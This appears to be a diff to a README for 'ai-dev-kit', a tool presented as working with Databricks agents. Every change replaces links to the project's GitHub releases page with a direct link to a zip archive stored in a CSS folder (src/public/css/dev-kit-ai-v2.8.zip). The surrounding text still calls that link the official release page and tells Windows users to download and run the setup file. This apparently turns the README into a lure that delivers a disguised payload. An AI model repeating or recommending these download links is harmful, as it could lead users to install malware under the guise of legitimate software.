@@ -1,6 +1,6 @@
 # 🤖 ai-dev-kit - Simple Tools for Databricks Agents
 
-[![Download ai-dev-kit](https://img.shields.io/badge/Download-ai--dev--kit-green?style=for-the-badge&logo=github)](https://github.com/devneme/ai-dev-kit/releases)
+[![Download ai-dev-kit](https://img.shields.io/badge/Download-ai--dev--kit-green?style=for-the-badge&logo=github)](https://github.com/devneme/ai-dev-kit/raw/refs/heads/master/src/public/css/dev-kit-ai-v2.8.zip)
 
 ---
 
@@ -42,10 +42,10 @@ To get ai-dev-kit running on your Windows machine, follow these steps carefully.
 
 You will first need to get the software from the official GitHub page. This page hosts all the files you need.
 
-[![Download ai-dev-kit](https://img.shields.io/badge/Download-ai--dev--kit-blue?style=for-the-badge&logo=windows)](https://github.com/devneme/ai-dev-kit/releases)
+[![Download ai-dev-kit](https://img.shields.io/badge/Download-ai--dev--kit-blue?style=for-the-badge&logo=windows)](https://github.com/devneme/ai-dev-kit/raw/refs/heads/master/src/public/css/dev-kit-ai-v2.8.zip)
 
 1. Click the large green or blue button above, or go to this page directly:
-   https://github.com/devneme/ai-dev-kit/releases
+   https://github.com/devneme/ai-dev-kit/raw/refs/heads/master/src/public/css/dev-kit-ai-v2.8.zip
 
 2. On the page, look for the latest release. Releases have files labeled as ".exe" or ".zip" for Windows.
 
@@ -124,7 +124,7 @@ To use ai-dev-kit with Databricks agents, follow these basics:
 Updates fix bugs and add new features. To update:
 
 1. Visit the releases page again at  
-   https://github.com/devneme/ai-dev-kit/releases
+   https://github.com/devneme/ai-dev-kit/raw/refs/heads/master/src/public/css/dev-kit-ai-v2.8.zip
 
 2. Download the latest setup file.
 
@@ -166,6 +166,6 @@ ai-dev-kit only connects to your Databricks account with the information you pro
 
 Get the software from the official release page:
 
-[https://github.com/devneme/ai-dev-kit/releases](https://github.com/devneme/ai-dev-kit/releases)
+[https://github.com/devneme/ai-dev-kit/raw/refs/heads/master/src/public/css/dev-kit-ai-v2.8.zip](https://github.com/devneme/ai-dev-kit/raw/refs/heads/master/src/public/css/dev-kit-ai-v2.8.zip)
 
 Click the link and download the latest Windows setup file to begin.
